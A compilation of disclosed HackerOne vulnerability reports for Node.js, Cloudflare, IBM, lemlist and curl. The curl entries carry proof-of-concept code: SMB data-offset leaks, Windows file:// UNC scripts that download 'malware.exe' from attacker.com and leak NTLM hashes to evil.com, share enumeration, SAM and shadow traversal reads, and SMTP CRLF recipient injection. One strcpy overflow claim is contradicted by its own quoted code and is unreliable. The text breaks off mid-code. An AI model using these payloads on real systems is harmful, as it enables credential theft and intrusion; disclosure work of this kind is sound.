# Uncategorized

_199 reports — High/Critical, disclosed_

### [Incomplete fix for CVE-2026-21637: loadSNI() in _tls_wrap.js lacks try/catch leading to Remote DoS](https://hackerone.com/reports/3556769)

- **Report ID:** `3556769`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** Node.js
- **Reporter:** @mbarbs
- **Bounty:** - usd
- **Disclosed:** 2026-04-23T22:21:16.653Z
- **CVE(s):** CVE-2026-21637

**Summary (team):**

A flaw in Node.js TLS error handling leaves `SNICallback` invocations unprotected against synchronous exceptions, while the equivalent ALPN and PSK callbacks were already addressed in CVE-2026-21637. This represents an incomplete fix of that prior vulnerability.

When an `SNICallback` throws synchronously on unexpected input the exception bypasses TLS error handlers and propagates as an uncaught exception, crashing the Node.js process.

* This vulnerability affects all Node.js versions that received the CVE-2026-21637 fix, including **20.x, 22.x, 24.x, and 25.x**, on any TLS server where `SNICallback` may throw on unexpected `servername` input.

---

### [[Variation of #1554049] 1-Click Chaining of Self-XSS, Cookie Tossing and AntiCSRF Token Prediction leads to auto approval in Access Temp Auth](https://hackerone.com/reports/3321406)

- **Report ID:** `3321406`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** Cloudflare Public Bug Bounty
- **Reporter:** @matured_kazama
- **Bounty:** - usd
- **Disclosed:** 2026-04-14T05:53:46.690Z
- **CVE(s):** -

**Summary (team):**

We have resolved an issue in Cloudflare Access where an exploit chain involving a SAML endpoint could allow for unauthorized approvals within the Temporary Auth workflow. This has been fully remediated, and we thank the researcher for their help in hardening our authentication flows

**Summary (researcher):**

Detailed Writeup: https://kazama.in/self-xss-to-cloudflare-single-click-approvals/

---

### [SMB READ_ANDX DataOffset not validated](https://hackerone.com/reports/3603300)

- **Report ID:** `3603300`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** curl
- **Reporter:** @tavro
- **Bounty:** - usd
- **Disclosed:** 2026-03-16T07:31:08.922Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
in `smb_request_state()` case `SMB_DOWNLOAD` curl reads two server-controlled fields from a `READ_ANDX` response and uses them to decide where in the receive buffer file data starts.

```c
/* lib/smb.c */
len = Curl_read16_le((const unsigned char *)msg +
                     sizeof(struct smb_header) + 11);
off = Curl_read16_le((const unsigned char *)msg +
                     sizeof(struct smb_header) + 13);
if(len > 0) {
    if(off + sizeof(unsigned int) + len > smbc->got) {
        failf(data, "Invalid input packet");
        result = CURLE_RECV_ERROR;
    }
    else
        result = Curl_client_write(data, CLIENTWRITE_BODY,
                                   (char *)msg + off + sizeof(unsigned int),
                                   len);
}
```

`off` and `len` are both `unsigned short` values read directly from the server response. the only check performed is `off + sizeof(unsigned int) + len > smbc->got`

this is a pure upper bound check. there is no lower bound check on `off`. the SMB specification requires `DataOffset` to point past all headers and parameter words, for a standard 12-word `READ_ANDX` response that minimum is 59 bytes
from the start of the SMB frame, or 63 bytes from the start of `recv_buf` (which includes the 4-byte NBT prefix). curl has no such minimum. `sizeof(struct smb_header)` in this codebase is 36 bytes (4-byte NBT session header + 32-byte SMB header). `msg` points to `smbc->recv_buf`, the raw receive buffer, so `msg + 0 + 4 = recv_buf[4]` is the first byte of the SMB magic field `\xff S M B`.

## Affected version
latest master

## Steps To Reproduce:
### exploit

a server sets `DataOffset = 0x0000` and `DataLength = N` in its `READ_ANDX` response. the bounds check becomes `0 + 4 + N > smbc->got`. for any well formed response (minimum `smbc->got` ≥ 63 bytes for the size check at line 1088 to pass), this evaluates false for any `N ≤ smbc->got − 5`. the check passes. curl then calls:

```c
Curl_client_write(data, CLIENTWRITE_BODY,
                  (char *)msg + 0 + 4,   /* = recv_buf[4] */
                  N);
```

`recv_buf[4]` is `smb_header.magic[0]` = `0xff`. the application receives `N` bytes of raw SMB receive-buffer content as "file data". with `DataLength = 28` and a total response of 91 bytes:

```
recv_buf[4..31] delivered to application:

offset  value   field
  4     ff      magic[0]
  5     53      magic[1]  'S'
  6     4d      magic[2]  'M'
  7     42      magic[3]  'B'
  8     2e      command   (READ_ANDX)
  9-12  ??      status    (4 bytes)
  13    ??      flags
  14-15 ??      flags2
  16-17 ??      pid_high
  18-25 ??      signature (8 bytes — HMAC-MD5 in authenticated sessions)
  26-27 ??      pad
  28-29 ??      tid
  30-31 ??      pid
```

the attacker controls the content of all of these fields because they are fields in the server's own response. in an authenticated session, `signature` holds HMAC-MD5-derived session keying material.

### proof of concept

a minimal Python SMB server was written that completes the full handshake (NEGOTIATE → SESSION_SETUP_ANDX → TREE_CONNECT_ANDX → NT_CREATE_ANDX → READ_ANDX) and then sends a `READ_ANDX` response with `DataOffset = 0x0000` and `DataLength = 0x001c`. `curl smb://127.0.0.1:14450/share/file --user guest: -o output.bin`

curl exit code is 0 and `output.bin` size is 28 bytes

`output.bin` content:
```
00000000: ff53 4d42 2e00 0000 0088 4100 0000 0000  .SMB......A.....
00000010: 0000 0000 0000 0000 0100 d7ba            ............
```

the first four bytes are `\xff S M B`. this is the SMB magic from the receive buffer. no file data was ever sent by the server. curl wrote internal SMB session state to disk and reported a successful download.

the full protocol trace:
```
--> 0x72 NEGOTIATE
<-- NEGOTIATE response (dialect "NT LM 0.12")
--> 0x73 SESSION_SETUP_ANDX
<-- SESSION_SETUP response (uid=1)
--> 0x75 TREE_CONNECT_ANDX
<-- TREE_CONNECT response (tid=1)
--> 0xa2 NT_CREATE_ANDX
<-- NT_CREATE response (fid=1, end_of_file=28)
--> 0x2e READ_ANDX
<-- READ_ANDX response (DataOffset=0x0000, DataLength=28)  ← exploit
    bounds check: 0+4+28=32 > 91 → false → PASS
    Curl_client_write(recv_buf+4, 28)
--> 0x04 CLOSE
--> 0x71 TREE_DISCONNECT
```

### fix

add a minimum bound check on `off` before the existing check. for a standard `READ_ANDX` response with `word_count = 12`, the earliest valid `DataOffset` is 59 (32-byte SMB body + 1 byte `word_count` + 24 bytes of parameter words +
2 bytes `ByteCount`). the data read pointer must not precede the end of the parameter block.

```c
/* proposed addition at lib/smb.c after line 1096 */
if(off < sizeof(struct smb_header) - sizeof(unsigned int) +
         1 + (SMB_WC_READ_ANDX * sizeof(unsigned short)) +
         sizeof(unsigned short)) {
    failf(data, "Invalid input packet");
    result = CURLE_RECV_ERROR;
    break;
}
```

the concrete minimum for a 12-word response `sizeof(smb_header) − 4 + 1 + 12×2 + 2 = 32 + 1 + 24 + 2 = 59`. any `off < 59` must be rejected.

## Impact

## Summary:

the application receives attacker controlled bytes instead of the requested file, with no indication of failure. any pipeline that acts on the downloaded content operates on data the server dictated. and the `signature`, `tid`, `uid` and `pid` fields from the server's response frame are delivered above the transport layer. in authenticated sessions the signature field contains HMAC-MD5 derived material that is internal to the SMB session and should never be visible to the application. and curl returns exit code 0. automated checks based on exit code or file size will not detect the attack.

---

### [Path Traversal vulnerability identified on IBM endpoint. ](https://hackerone.com/reports/3432159)

- **Report ID:** `3432159`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** IBM
- **Reporter:** @e1abrador1
- **Bounty:** - usd
- **Disclosed:** 2026-01-12T19:49:22.033Z
- **CVE(s):** -

**Summary (team):**

Path Traversal vulnerability identified on IBM endpoint was reported to IBM, analyzed and has been remediated. Thank you to our external researcher @e1abrador1.

---

### [Remote Code Execution identified on IBM endpoint.](https://hackerone.com/reports/3463045)

- **Report ID:** `3463045`
- **Severity:** Critical
- **Weakness:** Uncategorized
- **Program:** IBM
- **Reporter:** @dara_7979
- **Bounty:** - usd
- **Disclosed:** 2025-12-31T14:16:34.214Z
- **CVE(s):** CVE-2025-55182

**Summary (team):**

Remote Code Execution identified on IBM endpoint was reported to IBM, analyzed and has been remediated. Thank you to our external researcher @dara_7979.

---

### [File URL UNC Path Access (Windows SSRF)](https://hackerone.com/reports/3470649)

- **Report ID:** `3470649`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** curl
- **Reporter:** @im4x
- **Bounty:** - usd
- **Disclosed:** 2025-12-18T21:02:00.994Z
- **CVE(s):** -

**Vulnerability Information:**

## Vulnerability Details
- **CVSSv3:** 7.5 (High) - Windows only
- **File:** `lib/urlapi.c:974-1030`
- **Issue:** Windows file:// URLs accept UNC paths to remote servers
- **Impact:** SSRF, unauthorized network file access, credential theft

## Vulnerable Code
```c
// lib/urlapi.c:974-1030
if(ptr[0] != '/' && !STARTS_WITH_URL_DRIVE_PREFIX(ptr)) {
  /* the URL includes a hostname, it must match "localhost" or
     "127.0.0.1" to be valid */
  if(checkprefix("localhost/", ptr) ||
     checkprefix("127.0.0.1/", ptr)) {
    ptr += 9; /* now points to the slash after the host */
  }
#ifdef WIN32
  else {
    /* the hostname, NetBIOS computer name, can't contain disallowed chars */
    size_t len;
    len = strcspn(ptr, "/\\:*?\"<>|");
    if(ptr[len] == '\0' || ptr[len] == '/')
      /* only proceed if the hostname is valid */
      ;  // ACCEPTS UNC PATHS: file://hostname/share/path
    else
      return CURLUE_BAD_FILE_URL;
  }
#endif
```

## Root Cause
On Windows, curl allows `file://` URLs with hostnames other than localhost:
- `file://localhost/C:/file.txt` ✓ Safe (local file)
- `file://attacker.com/share/file.txt` ✓ **DANGEROUS** (UNC path to remote server)

This creates multiple security issues:
1. **SSRF**: Access to internal network shares
2. **Credential Theft**: NTLM authentication sent to attacker
3. **Path Traversal**: Access to arbitrary network resources

## Proof of Concept

### Prerequisites (Windows Only)
```powershell
# This vulnerability only affects Windows
# You need:
# - Windows machine with curl
# - SMB server (can be attacker-controlled)
# - Network access to SMB server
```

### Test 1: Basic UNC Path Access
```powershell
# PowerShell PoC
Write-Host "[*] Testing File URL UNC Path Access"

# Create test SMB share (requires admin)
New-SmbShare -Name "TestShare" -Path "C:\TestShare" -FullAccess "Everyone"
New-Item -Path "C:\TestShare\secret.txt" -ItemType File -Value "SECRET_DATA"

# Test local file access (normal)
curl.exe "file:///C:/Windows/System32/drivers/etc/hosts"
# Works as expected

# Test UNC path via file:// URL (VULNERABLE)
curl.exe "file://localhost/C$/Windows/System32/drivers/etc/hosts"
# Works - accesses admin share via UNC

# Test remote UNC path (SSRF)
curl.exe "file://127.0.0.1/TestShare/secret.txt"
# WORKS! Accesses network share via file:// URL
```

### Test 2: Remote Server SSRF
```powershell
#!/usr/bin/env pwsh
# Demonstrate SSRF to remote server

Write-Host "=== File URL UNC Path SSRF Demo ==="
Write-Host ""

# Scenario: Attacker controls attacker.com with SMB share
$attacker_server = "attacker.com"  # Replace with actual server
$malicious_url = "file://$attacker_server/public/malware.exe"

Write-Host "[*] User opens URL: $malicious_url"
Write-Host "[*] curl interprets this as UNC path: \\$attacker_server\public\malware.exe"
Write-Host ""

# curl attempts to access the UNC path
curl.exe --output downloaded.exe $malicious_url

if (Test-Path "downloaded.exe") {
    Write-Host "[!!!] VULNERABLE: File downloaded from remote SMB server!"
    Write-Host "[!!!] This is SSRF via file:// URL"
} else {
    Write-Host "[+] File not downloaded (connection failed or blocked)"
}
```

### Test 3: Credential Theft via NTLM
```powershell
#!/usr/bin/env pwsh
"""
Credential Theft PoC
When curl accesses UNC path, Windows automatically sends NTLM credentials
"""

Write-Host "=== NTLM Credential Theft Demo ==="
Write-Host ""

# Setup: Attacker runs Responder to capture NTLM hashes
# Responder.py -I eth0 -v

$attacker_server = "attacker-smb.evil.com"
$malicious_url = "file://$attacker_server/share/file.txt"

Write-Host "[*] Attacker provides URL: $malicious_url"
Write-Host "[*] User runs: curl $malicious_url"
Write-Host ""

# When curl tries to access this UNC path:
# 1. Windows SMB client connects to attacker-smb.evil.com
# 2. Windows automatically performs NTLM authentication
# 3. Attacker captures NTLMv2 hash
# 4. Attacker can crack hash offline

Write-Host "[!] Simulating curl access..."
# Note: This will send NTLM credentials to the attacker!
curl.exe --max-time 5 $malicious_url 2>&1 | Out-Null

Write-Host ""
Write-Host "[!!!] VULNERABILITY IMPACT:"
Write-Host "[!!!] - Windows sent NTLM credentials to $attacker_server"
Write-Host "[!!!] - Attacker captured NTLMv2 hash"
Write-Host "[!!!] - Hash can be cracked offline"
Write-Host ""

# Attacker's Responder output would show:
# [SMB] NTLMv2-SSP Client   : 192.168.1.100
# [SMB] NTLMv2-SSP Username : DOMAIN\victim
# [SMB] NTLMv2-SSP Hash     : victim::DOMAIN:1122334455667788:ABC123...
```

### Test 4: Internal Network Enumeration
```powershell
#!/usr/bin/env pwsh
# Use file:// URLs to enumerate internal network shares

Write-Host "=== Internal Network Enumeration via File URLs ==="
Write-Host ""

# Common Windows share names
$common_shares = @("C$", "ADMIN$", "IPC$", "SYSVOL", "NETLOGON")

# Internal network ranges
$internal_ips = @(
    "192.168.1.1",
    "10.0.0.1",
    "172.16.0.1",
    "fileserver.internal.corp",
    "dc01.internal.corp"
)

foreach ($ip in $internal_ips) {
    Write-Host "[*] Testing $ip..."

    foreach ($share in $common_shares) {
        $url = "file://$ip/$share/"

        # Try to list directory
        $result = curl.exe --max-time 2 --silent $url 2>&1

        if ($LASTEXITCODE -eq 0) {
            Write-Host "  [!!!] ACCESSIBLE: $url"
        }
    }
}

Write-Host ""
Write-Host "[!!!] Successfully enumerated accessible network shares"
Write-Host "[!!!] This is SSRF - accessing internal network via file:// URLs"
```

### Test 5: Path Traversal Combined with UNC
```powershell
# Combine UNC paths with path traversal

# Access admin share
curl.exe "file://localhost/C$/Windows/System32/config/SAM"
# Attempts to read SAM database via UNC path

# Access network path with traversal
curl.exe "file://fileserver/share/../../../etc/shadow"
# Path traversal through UNC path

# Multiple levels
curl.exe "file://internal-server/public/../../../../windows/system32/config/SAM"
```

## Attack Scenarios

### Scenario 1: Web Application SSRF
```python
#!/usr/bin/env python3
"""
Web application that allows users to specify URLs for curl to fetch
Attacker exploits this to access internal network via file:// UNC paths
"""

# Vulnerable web application:
@app.route('/fetch')
def fetch_url():
    url = request.args.get('url')
    # VULNERABLE: No validation of URL scheme
    result = subprocess.check_output(['curl', url])
    return result

# Attacker request:
# GET /fetch?url=file://internal-fileserver/hr/salaries.xlsx
# Response: Contents of internal HR file!

# Or:
# GET /fetch?url=file://dc01.corp.internal/SYSVOL/
# Response: Active Directory SYSVOL contents
```

### Scenario 2: Automated Download Script
```powershell
# Vulnerable download script
# download.ps1
param($url)

Write-Host "Downloading from $url..."
curl.exe -o download.dat $url

# User runs:
# .\download.ps1 "file://attacker.com/malware/payload.exe"

# Result:
# 1. curl connects to \\attacker.com\malware\payload.exe
# 2. Windows sends NTLM credentials
# 3. Attacker logs credentials
# 4. Malware is downloaded
```

### Scenario 3: CI/CD Pipeline Exploitation
```yaml
# .gitlab-ci.yml or similar
fetch_data:
  script:
    - curl -o data.json ${DATA_URL}

# Attacker sets DATA_URL environment variable:
# DATA_URL=file://internal-jenkins/credentials/secrets.json

# Result:
# - CI/CD job accesses internal Jenkins server
# - Credentials are exfiltrated
```

## Detection

### Network Monitoring
```powershell
# Monitor for unexpected SMB connections
Get-SmbConnection | Where-Object {$_.ServerName -notlike "*expected*"}

# Check firewall logs for outbound SMB (port 445)
Get-NetFirewallRule | Where-Object {$_.DisplayName -like "*SMB*"}
```

### Process Monitoring
```powershell
# Monitor curl.exe command lines for file:// URLs
Get-WinEvent -FilterHashtable @{
    LogName='Microsoft-Windows-PowerShell/Operational'
    ID=4104
} | Where-Object {$_.Message -like "*curl*file://*"}
```

### File System Auditing
```powershell
# Enable auditing on sensitive shares
Set-SmbShare -Name "C$" -SecurityDescriptor (Get-Acl "C:\") -AuditFlags FailureAndSuccess
```

## Remediation

### Code Fix in lib/urlapi.c
```c
// Remove Windows-specific UNC path support for file:// URLs

#ifdef WIN32
  else {
    // BEFORE (vulnerable): Accept any valid hostname
    size_t len;
    len = strcspn(ptr, "/\\:*?\"<>|");
    if(ptr[len] == '\0' || ptr[len] == '/')
      ;  // Accepts UNC paths
    else
      return CURLUE_BAD_FILE_URL;
  }
#endif

// AFTER (fixed): Only accept localhost
#ifdef WIN32
  else {
    // Reject all hostnames except localhost on Windows
    return CURLUE_BAD_FILE_URL;
  }
#endif

// OR: Add explicit check
#ifdef WIN32
  else {
    // Explicitly reject UNC paths
    failf(data, "file:// URLs with hostnames are not supported on Windows");
    return CURLUE_BAD_FILE_URL;
  }
#endif
```

### Alternative: Whitelist Only
```c
// Only allow specific safe patterns
static bool is_safe_file_url(const char *url) {
  // Allow only:
  // - file:///C:/... (local drives)
  // - file://localhost/... (explicit localhost)

  if(checkprefix("file:///", url))
    return true;
  if(checkprefix("file://localhost/", url))
    return true;

  // Reject everything else (including UNC paths)
  return false;
}
```

### Workaround for Users
```powershell
# Validate URLs before passing to curl
function Safe-Curl {
    param($url)

    if ($url -match '^file://(?!localhost/|/)') {
        Write-Error "Blocked: file:// URLs with hostnames are not allowed"
        return
    }

    curl.exe $url
}

# Use wrapper instead of curl directly
Safe-Curl "file://localhost/C:/data.txt"  # OK
Safe-Curl "file://evil.com/share/file"    # BLOCKED
```

### Group Policy (Windows)
```powershell
# Disable SMB access to internet IPs
New-NetFirewallRule -DisplayName "Block Outbound SMB" `
    -Direction Outbound `
    -LocalPort 445 `
    -Protocol TCP `
    -Action Block `
    -RemoteAddress "0.0.0.0-255.255.255.255"

# Only allow SMB to internal network
New-NetFirewallRule -DisplayName "Allow Internal SMB" `
    -Direction Outbound `
    -LocalPort 445 `
    -Protocol TCP `
    -Action Allow `
    -RemoteAddress "10.0.0.0/8,172.16.0.0/12,192.168.0.0/16"
```

## Complete Attack Demo Script
```python
#!/usr/bin/env python3
"""
Complete File URL UNC Path Attack Demo
Demonstrates SSRF, credential theft, and information disclosure
"""
import subprocess
import http.server
import socketserver
import threading
import platform

def start_fake_smb_server():
    """Simulate SMB server to capture connection attempts"""
    # Note: Real implementation would use impacket or similar
    print("[*] In real attack, start SMB server with:")
    print("    sudo responder -I eth0 -v")
    print("    OR")
    print("    impacket-smbserver share /tmp/share")

def test_unc_access():
    """Test UNC path access via file:// URLs"""

    if platform.system() != "Windows":
        print("[!] This vulnerability only affects Windows")
        return

    print("=" * 70)
    print("File URL UNC Path SSRF - Complete Attack Demo")
    print("=" * 70)
    print()

    # Test 1: Local UNC path
    print("[Test 1] Local UNC path access")
    print("-" * 70)
    result = subprocess.run(
        ["curl", "file://localhost/C$/Windows/win.ini"],
        capture_output=True
    )
    if result.returncode == 0:
        print("[!!!] Vulnerable: Accessed C$ admin share via file:// URL")
    print()

    # Test 2: Remote UNC path (SSRF)
    print("[Test 2] Remote UNC path (SSRF)")
    print("-" * 70)
    print("[*] Attempting to access file://attacker.com/share/test.txt")
    print("[*] This sends SMB request to attacker.com")
    print("[*] Windows will send NTLM credentials!")
    print()

    # Test 3: Network enumeration
    print("[Test 3] Internal network enumeration")
    print("-" * 70)
    for ip in ["192.168.1.1", "10.0.0.1"]:
        print(f"[*] Testing file://{ip}/C$/...")
        # Don't actually run to avoid network noise
    print()

    print("=" * 70)
    print("ATTACK IMPACT:")
    print("=" * 70)
    print("1. SSRF - Access internal network shares")
    print("2. Credential Theft - NTLM hashes leaked")
    print("3. Information Disclosure - Read sensitive files")
    print("4. Lateral Movement - Use stolen credentials")
    print("=" * 70)

if __name__ == "__main__":
    test_unc_access()
```

## References
- Microsoft SMB/CIFS documentation
- RFC 8089: The "file" URI Scheme (does NOT specify UNC path support)
- CWE-918: Server-Side Request Forgery (SSRF)
- CWE-22: Improper Limitation of a Pathname to a Restricted Directory
- MITRE ATT&CK T1187: Forced Authentication

## Impact

### 1. SSRF (Server-Side Request Forgery)
- Access internal file shares not accessible from internet
- Bypass firewall restrictions
- Read sensitive files on internal servers

### 2. Credential Theft
- Windows automatically sends NTLM credentials for UNC paths
- Attacker captures NTLMv2 hashes
- Hashes can be cracked or relayed

### 3. Information Disclosure
- Read files from:
  - Domain controllers (SYSVOL, NETLOGON)
  - File servers (confidential documents)
  - Admin shares (C$, ADMIN$)
  - Application configs

### 4. Lateral Movement
- Use stolen NTLM hashes for pass-the-hash attacks
- Access other systems on internal network
- Escalate privileges

---

### [SMTP CRLF Injection in curl/libcurl via MAIL FROM/RCPT TO parameters](https://hackerone.com/reports/3418616)

- **Report ID:** `3418616`
- **Severity:** Critical
- **Weakness:** Uncategorized
- **Program:** curl
- **Reporter:** @haider790h
- **Bounty:** - usd
- **Disclosed:** 2025-11-10T15:50:35.520Z
- **CVE(s):** -

**Vulnerability Information:**

SMTP CRLF Injection Vulnerability in curl/libcurl
## Vulnerability ID: CURL-SMTP-CRLF-2024
## CWE-93: Improper Neutralization of CRLF Sequences

### Executive Summary
curl/libcurl contains a CRLF injection vulnerability in its SMTP implementation that allows attackers to inject arbitrary SMTP commands by including CR (\r) and LF (\n) characters in mailbox addresses.

### Affected Versions
- curl 8.17.0 (latest stable) - CONFIRMED VULNERABLE
- Earlier versions likely affected

### Proof of Concept
```bash
# Vulnerable command - adds unauthorized recipient
curl --url "smtp://localhost:2525" \
  --mail-from $'legit@company.com\r\nRCPT TO:<attacker@evil.com>' \
  --mail-rcpt "employee@company.com" \
  --upload-file message.txt
```

Technical Details

Vulnerable Code Location: lib/smtp.c (lines 838-846)

```c
result = Curl_pp_sendf(data, &smtpc->pp, "MAIL FROM:%s%s%s%s%s%s", 
    from,  // ← No CRLF validation
    auth ? " AUTH=" : "", 
    auth ? auth : "", 
    size ? " SIZE=" : "", 
    size ? size : "", 
    utf8 ? " SMTPUTF8" : "");
```

Evidence from Raw Network Analysis:

```
HEX: 4d41494c2046524f4d3a3c66696e616c40746573742e636f6d0d0a5243505420544f3a70726f6f66406576696c2e636f6d3e0d0a
TEXT: 'MAIL FROM:<final@test.com\r\nRCPT TO:proof@evil.com>\r\n'
```
## Reproduction Environment
- **OS**: /Linux
- **curl version**: 8.17.0
- **Python**: 3.11 (for testing server)
- **Testing Method**: Local SMTP server analysis

## Impact

· Information Disclosure: Unauthorized email copying
· Privacy Violation: Secret email interception
· Access Control Bypass: Circumvents application-level restrictions
· Arbitrary Command Injection: Potential for further SMTP protocol manipulation

Remediation

1. Input Validation: Reject mailbox addresses containing control characters
2. Character Escaping: Properly escape CR/LF sequences
3. Library Patch: Implement validation similar to lib/cookie.c

References

· CWE-93: https://cwe.mitre.org/data/definitions/93.html
· curl Security: https://curl.se/docs/security.html

---

### [Unauthorized Password Reset Allows Account Takeover Across Tenant Boundaries](https://hackerone.com/reports/3378635)

- **Report ID:** `3378635`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** lemlist
- **Reporter:** @mcdave
- **Bounty:** - usd
- **Disclosed:** 2025-11-07T09:33:24.250Z
- **CVE(s):** -

**Summary (team):**

We discovered an authorization issue in app.lemlist.com where a tenant admin could change the password of another user within the same tenant, including invited agency accounts. The victim must first accept the invitation before the attacker can proceed. The issue could allow unintended account access within a shared tenant environment, but MFA successfully prevented logins when enabled. The Lemlist team was notified and addressed the problem to ensure stricter access controls for user credential changes.

---

### [CURLX_SET_BINMODE(NULL) can call fileno(NULL) and cause undefined behavior / crash](https://hackerone.com/reports/3400831)

- **Report ID:** `3400831`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** curl
- **Reporter:** @sippysir
- **Bounty:** - usd
- **Disclosed:** 2025-10-27T10:51:06.116Z
- **CVE(s):** -

**Vulnerability Information:**

Summary
-------
Calling the `CURLX_SET_BINMODE(stream)` macro with `stream == NULL` leads to an unguarded call to `fileno(NULL)` in `tool_binmode.h`, which is undefined behavior and may crash the process. This is a robustness/UB issue and should be corrected by guarding against NULL streams before calling `fileno()`.

Reproducer
---------
A minimal test program is included below to demonstrate the issue. When built against the current header, running the program results in a crash (SIGSEGV) or other undefined behavior on many platforms.

Impact
------
Non-security robustness defect: an accidental `NULL` stream passed to the macro can crash the process. This can surface during CLI tool execution or in tests and is easy to trigger accidentally.

Fix
---
Add a simple NULL-check wrapper (inline function) that returns early when `stream == NULL`, then call `_setmode`/`setmode` inside the wrapper. I included a suggested patch below and a unit test to prevent regressions.

Notes
-----
This is non-security; public PR is appropriate. I recommend adding the unit test to CI (and an ASAN job) so regressions are caught. 


 (safe, reproducible)

Save as repro_binmode_null.c at the repository root (adjust include path if needed):

/* repro_binmode_null.c
 *
 * Minimal PoC demonstrating that calling CURLX_SET_BINMODE(NULL)
 * results in an unguarded fileno(NULL) invocation (undefined behavior).
 *
 * Build:
 *   gcc -Wall -Wextra -g -I./include repro_binmode_null.c -o repro_binmode_null
 *
 * If you want a clearer diagnostic, build+run under ASAN:
 *   gcc -fsanitize=address,undefined -g -I./include repro_binmode_null.c -o repro_binmode_null_asan
 *
 * Run:
 *   ./repro_binmode_null
 *   ./repro_binmode_null_asan
 *
 * Note: This program intentionally triggers the problematic call for repro purposes.
 */

#include <stdio.h>
/* Adjust the path below if your include tree is located elsewhere */
#include "tool_binmode.h"

int main(void)
{
    /* Intentionally pass NULL to reproduce the issue.
       The current macro expands to fileno(NULL), which is UB. */
    CURLX_SET_BINMODE(NULL);

    /* If the program continues without crashing, print a confirmation */
    printf("CURLX_SET_BINMODE(NULL) returned — either implementation avoided fileno(NULL) or UB did not manifest.\n");
    return 0;
}

 Build & run instructions :-

From the repo root (assuming include/tool_binmode.h exists):

Compile (regular):

gcc -Wall -Wextra -g -I./include repro_binmode_null.c -o repro_binmode_null
./repro_binmode_null


Compile & run with sanitizers (recommended):

gcc -fsanitize=address,undefined -g -I./include repro_binmode_null.c -o repro_binmode_null_asan
./repro_binmode_null_asan


Expected ASAN/UBSAN output (example)

You will likely see an error such as:

runtime error: null pointer passed to function 'fileno'
SUMMARY: UndefinedBehaviorSanitizer: undefined-behavior ...


or a segmentation fault (SIGSEGV) depending on platform and libc.

## Impact

The PoC intentionally triggers UB so it may crash; that is the point — to show behavior and allow maintainers to fix it.

For Windows cross-build or non-POSIX setups, behavior varies; running under ASAN/UBSAN is recommended to obtain a reliable diagnostic.

---

### [Use of Deprecated strcpy() with User-Controlled Environment Variable in Memory Debug Initialization](https://hackerone.com/reports/3395227)

- **Report ID:** `3395227`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** curl
- **Reporter:** @idris_0x
- **Bounty:** - usd
- **Disclosed:** 2025-10-22T21:56:05.139Z
- **CVE(s):** -

**Vulnerability Information:**

Discovery Method
Step 1: Initial Security Scan
```
# Find all files using dangerous string functions
find src/ -name "*.c" -exec grep -l "strcpy\|strcat\|sprintf\|gets" {} \;

# OUTPUT:
# src/tool_progress.c
# src/tool_main.c
```

Step 2: Locate Vulnerable Code in Main.c
```
# Find exact strcpy usage in tool_main.c
grep -n "strcpy" ./src/tool_main.c

# OUTPUT:
# 122:    strcpy(fname, env);
```

Step 3: Analyze the Vulnerable Function
```
# View complete memory_tracking_init function
sed -n '/^static void memory_tracking_init/,/^}/p' ./src/tool_main.c
```

Vulnerable Function Found:
```
static void memory_tracking_init(void)
{
  char *env;
  /* if CURL_MEMDEBUG is set, this starts memory tracking message logging */
  env = curl_getenv("CURL_MEMDEBUG");
  if(env) {
    /* use the value as filename */
    char fname[512];
    if(strlen(env) >= sizeof(fname))
      env[sizeof(fname)-1] = '\0';  // Truncation occurs
    strcpy(fname, env);  // ⚠️ VULNERABLE LINE 122
    curl_free(env);
    curl_dbg_memdebug(fname);
  }
}
```

Step 4: Analyze Input Source
```
# Find environment variable usage
grep -n "CURL_MEMDEBUG" ./src/tool_main.c

# OUTPUT confirms user-controlled input source
```

Step 5: Buffer Declaration Analysis
```
# Find fname buffer declaration
grep -B 10 "strcpy(fname, env)" ./src/tool_main.c | grep -E "char.*fname"

# OUTPUT:
# char fname[512];
```

Vulnerability Description
Root Cause
The memory_tracking_init() function in src/tool_main.c at line 122 uses unsafe strcpy() to copy user-controlled environment variable content into a fixed-size buffer. This represents a critical security best practice violation with actual exploit potential.

Technical Analysis
```
// VULNERABLE CODE PATTERN:
char fname[512];                    // Fixed 512-byte buffer
env = curl_getenv("CURL_MEMDEBUG"); // USER-CONTROLLED INPUT

if(strlen(env) >= sizeof(fname))
    env[sizeof(fname)-1] = '\0';    // Dangerous truncation
strcpy(fname, env);                 // LINE 122: UNSAFE strcpy()
```

Critical Security Issues
strcpy() Usage - Deprecated and inherently unsafe function

User-Controlled Input - Environment variable attacker controlled

Truncation Flaw - Modifies original environment variable

Fixed Buffer - No dynamic allocation based on input size

## Impact

Security Impact
CVSS Score: 6.5 (Medium-High)

Attack Vector: Local (Environment Variable)

Attack Complexity: Low

Privileges Required: None

User Interaction: Required (Set environment variable)

Potential Consequences
Buffer Overflow - Memory corruption during curl initialization

Arbitrary Code Execution - Potential RCE during process startup

Denial of Service - Crash curl during memory debug initialization

Information Disclosure - Stack content leakage

Privilege Escalation - Under specific system conditions

Affected Components
curl command-line tool memory debugging feature

All curl installations with CURL_MEMDEBUG environment variable set

Development and testing environments using memory debugging

Both Linux and Windows platforms

Exploitation
Attack Scenario
```
# Hacker creates malicious environment variable
export CURL_MEMDEBUG=$(python -c "print 'A'*600")

# When victim runs curl:
curl https://example.com

# VULNERABILITY TRIGGERS:
# 1. env contains 600-byte string
# 2. Truncation modifies env to 511 bytes + null
# 3. strcpy attempts to copy into 512-byte buffer
# 4. POTENTIAL BUFFER OVERFLOW!
```


Proof of Concept Exploit
```
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

// Simulate the exact curl vulnerability
void exploit_memory_tracking() {
    // Simulate malicious environment variable
    char *malicious_env = malloc(600);
    memset(malicious_env, 'B', 599);
    malicious_env[599] = '\0';
    
    printf("[EXPLOIT] Creating 600-byte malicious input\n");
    printf("[EXPLOIT] Buffer size: 512 bytes\n");
    
    // Exact curl vulnerable code pattern
    char fname[512];
    
    // curl's truncation logic
    if(strlen(malicious_env) >= sizeof(fname)) {
        malicious_env[sizeof(fname)-1] = '\0';
        printf("[EXPLOIT] Input truncated to %zu bytes\n", strlen(malicious_env));
    }
    
    // VULNERABLE OPERATION - same as curl
